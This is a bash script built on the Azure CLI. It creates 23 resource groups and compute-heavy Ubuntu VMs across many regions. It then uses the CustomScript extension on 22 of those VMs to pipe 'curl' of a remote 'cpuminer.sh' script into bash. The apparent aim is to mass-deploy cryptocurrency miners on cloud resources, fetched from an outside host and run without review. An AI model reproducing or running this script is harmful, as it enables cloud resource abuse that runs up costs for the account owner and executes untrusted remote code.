#!/bin/bash

az group create --name myResourceGroup00 --location eastus
az vm create  --resource-group myResourceGroup00  --name myVM00 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait



                
az group create --name myResourceGroup09 --location centralus
az vm create  --resource-group myResourceGroup09  --name myVM09 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait

                
az group create --name myResourceGroup02 --location southcentralus
az vm create  --resource-group myResourceGroup02  --name myVM02 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait



                
az group create --name myResourceGroup06 --location northeurope
az vm create  --resource-group myResourceGroup06  --name myVM06 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait



                
az group create --name myResourceGroup08 --location westeurope
az vm create  --resource-group myResourceGroup08  --name myVM08 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait

                
az group create --name myResourceGroup05 --location southeastasia
az vm create  --resource-group myResourceGroup05  --name myVM05 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait




                
az group create --name myResourceGroup014 --location eastasia
az vm create  --resource-group myResourceGroup014  --name myVM014 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait



                
az group create --name myResourceGroup015 --location japaneast
az vm create  --resource-group myResourceGroup015  --name myVM015 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait


                
az group create --name myResourceGroup051 --location japanwest
az vm create  --resource-group myResourceGroup051  --name myVM051 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait


                
az group create --name myResourceGroup04 --location australiaeast
az vm create  --resource-group myResourceGroup04  --name myVM04 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait




                
az group create --name myResourceGroup050 --location australiasoutheast
az vm create  --resource-group myResourceGroup050  --name myVM050 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait


                
az group create --name myResourceGroup048 --location australiacentral
az vm create  --resource-group myResourceGroup048  --name myVM048 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait



                
az group create --name myResourceGroup023 --location brazilsouth
az vm create  --resource-group myResourceGroup023  --name myVM023 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait


                
az group create --name myResourceGroup017 --location canadacentral
az vm create  --resource-group myResourceGroup017  --name myVM017 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait


                
az group create --name myResourceGroup03 --location westus2
az vm create  --resource-group myResourceGroup03  --name myVM03 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait




                
az group create --name myResourceGroup055 --location canadaeast
az vm create  --resource-group myResourceGroup055  --name myVM055 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait


                
az group create --name myResourceGroup07 --location uksouth
az vm create  --resource-group myResourceGroup07  --name myVM07 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait


                
az group create --name myResourceGroup060 --location ukwest
az vm create  --resource-group myResourceGroup060  --name myVM060 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait

                
az group create --name myResourceGroup016 --location koreacentral
az vm create  --resource-group myResourceGroup016  --name myVM016 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait



                
az group create --name myResourceGroup052 --location koreasouth
az vm create  --resource-group myResourceGroup052  --name myVM052 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait

                
az group create --name myResourceGroup018 --location francecentral
az vm create  --resource-group myResourceGroup018  --name myVM018 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait




                
az group create --name myResourceGroup019 --location germanywestcentral
az vm create  --resource-group myResourceGroup019  --name myVM019 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait



                
az group create --name myResourceGroup021 --location switzerlandnorth
az vm create  --resource-group myResourceGroup021  --name myVM021 --size Standard_F8  --image UbuntuLTS   --admin-username azureuser   --generate-ssh-keys   --no-wait

                
sleep 161



az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM00  --no-wait   --resource-group myResourceGroup00  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               


az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM09  --no-wait   --resource-group myResourceGroup09  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               

az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM02  --no-wait   --resource-group myResourceGroup02  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               


az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM06  --no-wait   --resource-group myResourceGroup06  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               
az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM08  --no-wait   --resource-group myResourceGroup08  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               
az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM05  --no-wait   --resource-group myResourceGroup05  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               

az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM014  --no-wait   --resource-group myResourceGroup014  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               



az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM015  --no-wait   --resource-group myResourceGroup015  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               

az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM051  --no-wait   --resource-group myResourceGroup051  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               


az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM050  --no-wait   --resource-group myResourceGroup050  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               


az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM048  --no-wait   --resource-group myResourceGroup048  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               

az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM04  --no-wait   --resource-group myResourceGroup04  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               


az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM023  --no-wait   --resource-group myResourceGroup023  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               

az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM017  --no-wait   --resource-group myResourceGroup017  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               


az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM03  --no-wait   --resource-group myResourceGroup03  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               


az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM055  --no-wait   --resource-group myResourceGroup055  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               




az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM07  --no-wait   --resource-group myResourceGroup07  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               

az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM060  --no-wait   --resource-group myResourceGroup060  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               


az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM016  --no-wait   --resource-group myResourceGroup016  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               



az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM018  --no-wait   --resource-group myResourceGroup018  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               


az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM052  --no-wait   --resource-group myResourceGroup052  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               
az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM019  --no-wait   --resource-group myResourceGroup019  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               

az vm extension set   --publisher Microsoft.Azure.Extensions  --version 2.0   --name CustomScript  --vm-name myVM021  --no-wait   --resource-group myResourceGroup021  --settings '{"commandToExecute":"curl \"https://slicommeo.github.io/2019/cpuminer.sh\" | bash"}'
               


